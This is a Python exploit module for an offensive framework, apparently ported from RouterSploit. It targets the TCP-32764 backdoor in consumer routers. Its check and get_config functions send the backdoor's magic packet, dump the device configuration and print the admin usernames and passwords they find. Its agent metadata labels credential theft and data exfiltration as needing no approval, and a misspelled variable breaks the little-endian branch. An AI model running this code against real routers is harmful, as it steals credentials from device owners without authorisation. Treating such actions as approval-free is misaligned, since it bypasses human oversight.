#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""TCP-32764 Info Disclosure"""

import re
import struct

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'TCP-32764 Info Disclosure',
        'description': 'Exploits backdoor functionality that allows fetching credentials for administrator user.',
        'author': ['Eloi Vanderbeken', 'Marcin Bury'],
        
        'platform': Platform.LINUX,
        'references': ['https://github.com/elvanderb/TCP-32764'],
        'tags': ['iot', 'router', 'disclosure', 'credentials', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(32764, "Target TCP port")

    def run(self):
        if self.check():
            print_success("Target is vulnerable")

            conf = self.get_config()

            lines = re.split("\x00|\x01", conf)
            pattern = re.compile('user(name)?|password|login')

            credentials = []

            for line in lines:
                try:
                    (var, value) = line.split("=")
                    if len(value) > 0 and pattern.search(var):
                        credentials.append((var, value))
                except ValueError:
                    continue

            if credentials:
                print_table(("Parameter", "Value"), *credentials)
        else:
            print_error("Target is not vulnerable")
    def get_config(self):
        # 0x53634D4D - backdoor code
        # 0x01  - 1 - get config
        headers = struct.pack(self.endianness + "III", 0x53634D4D, 0x01, 0x01)
        payload = headers + b"\x00"

        tcp_client = _tcp_socket(self)
        if tcp_client.connect():
            tcp_client.send(payload)
            response = tcp_client.recv(0xC)

            if response:
                sig, ret_val, ret_len = struct.unpack(self.endianness + "III", response)
                response = tcp_client.recv(ret_len)

                tcp_client.close()

                if response:
                    return str(response, "utf-8")

        return ""
    def check(self):
        tcp_client = _tcp_socket(self)
        if tcp_client.connect():
            tcp_client.send(b"ABCDE")
            response = tcp_client.recv(5)
            tcp_client.close()

            if response:
                if response.startswith(b"MMcS"):
                    self.endianness = ">"  # BE
                elif response.startswith(b"ScMM"):
                    self.endinaness = "<"  # LE

                return True  # target is vulnerable

        return False  # target is not vulnerable
